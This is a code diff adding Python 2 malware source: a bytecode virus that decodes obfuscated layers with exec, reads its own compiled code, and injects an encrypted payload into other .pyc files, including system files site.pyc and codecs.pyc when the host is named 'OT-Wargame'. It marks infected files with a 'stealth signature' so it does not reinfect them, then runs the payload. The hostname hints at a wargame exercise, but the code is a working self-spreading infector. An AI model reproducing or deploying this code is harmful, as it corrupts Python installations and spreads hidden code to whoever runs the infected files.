@@ -1,56 +1,78 @@
+__py_version__ = "PY_2.6" # haha bullshit, this is a stealth signature
+# -*- coding: utf-8 -*-
+
+import socket
 import marshal
-import base64
 import zlib
-import imp
+import glob
+from base64 import b64decode, b64encode
 
-import byteplay
-from obfuscation import obfuscate
-import xor_layer
-import bf_layer
+a = None
+DECRYPT = None
+exec b64decode("__XOR_LAYER_PY__")
+crypt = a
 
+if __file__.endswith('.pyc'):
+    template = b64decode("__TEMPLATE_PY__")
+    template = template.replace("__DECRYPT_PLACEHOLDER__", DECRYPT)
 
-# ------------- GENERATING PAYLOAD DATA ---------------
-payload_f = open("payload.py", "r")
-payload = payload_f.read()
-payload_f.close()
-payload = byteplay.Code.from_code(compile(payload, "a", "exec"))
-payload.code = payload.code[:-1]
-for i, instr in enumerate(payload.code):
-    if instr[0] == byteplay.SetLineno:
-        payload.code.pop(i)
-payload = base64.b64encode(marshal.dumps(payload.to_code()))
+    LOAD_CONST = None
+    RETURN_VALUE = None
+    Code = None
+    CodeList = None
+    EXEC_STMT = None
+    exec b64decode("__BYTEPLAY_PY__")
 
-# ------------- GENERATING BYTEPLAY DATA (for injector) ---------------
-byteplay_f = open("byteplay.py", "r")
-byteplay_src = base64.b64encode(zlib.compress(byteplay_f.read(), 9))
-byteplay_f.close()
+    f = open(__file__, 'r')
+    head = f.read(8)
+    data = Code.from_code(marshal.loads(f.read()))
+    f.close()
+    payload = data
 
-# ------------- GENERATING INJECTOR FILE ---------------
-injector_f = open("injector.py", "r")
-injector = injector_f.read()
-injector_f.close()
-injector = injector.replace("__PAYLOAD_PLACEHOLDER__", payload)
-injector = injector.replace("__BYTEPLAY_PLACEHOLDER__", byteplay_src)
-injector = compile(injector, "b", "exec")
-injector = base64.b64encode(zlib.compress(marshal.dumps(injector), 9))
+    EXPLOIT_SIZE = None
+    for i in xrange(2, len(data.code)):
+        if type(data.code[i][1]) == type('') and data.code[i][1] == __py_version__: #signature
+            EXPLOIT_SIZE = i + 2
+            break
+            #if not EXPLOIT_SIZE:
+            #print "EXPLOIT_SIZE not found"
 
+    data.code = data.code[:EXPLOIT_SIZE]
+    data.code.append((LOAD_CONST, None))
+    data.code.append((RETURN_VALUE, None))
+    payload_clear = zlib.compress(marshal.dumps(data.to_code()))
 
-# ------------- GENERATING LOLITA (FINAL) FILE ---------------
-lolita_f = open("lolita.py", "r")
-lolita = lolita_f.read()
-lolita_f.close()
+    def infect(f_to_infect):
+        #print "j'infecte %s" % f_to_infect
+        f = open(f_to_infect, 'r')
 
-lolita = lolita.replace("__FINAL_PLACEHOLDER__", injector)
-lolita = compile(lolita, "b", "exec")
+        head = f.read(8)
 
-lolita = marshal.dumps(lolita)
-for i in range(3):
-    lolita = obfuscate(lolita, bf_layer)
-for i in range(42):
-    lolita = obfuscate(lolita, xor_layer)
+        data = Code.from_code(marshal.loads(f.read()))
+        if data.code[1][1] == __py_version__: #signature
+            return
 
-lolita_f = open("lolita.final.pyc", "wb")
+        f.close()
 
-lolita_f.write(imp.get_magic() + ")\xb9\x1bQ")
-lolita_f.write(lolita)
-lolita_f.close()
+        payload = b64encode(crypt(payload_clear))
+        template_for_this_inject = template.replace("__PAYLOAD_PLACEHOLDER__", payload)
+        payload = Code.from_code(compile(template_for_this_inject, "", "exec")).code
+        payload = payload[:-2]
+        data.code[:0] = payload
+
+        newfile = open(f_to_infect, 'w')
+        newfile.write(head)
+        marshal.dump(data.to_code(), newfile)
+        newfile.close()
+
+    if socket.gethostname() == "OT-Wargame":
+        targets = ["/usr/lib/python2.6/site.pyc", "/usr/lib/python2.6/codecs.pyc"]
+    else:
+        targets = glob.glob("./targets/*.pyc")
+
+    for i in targets:
+        infect(i)
+
+    exec b64decode("__PAYLOAD_PY__")
+
+__py_version__ = "PY_2.6" # haha bullshit, this is a stealth signature
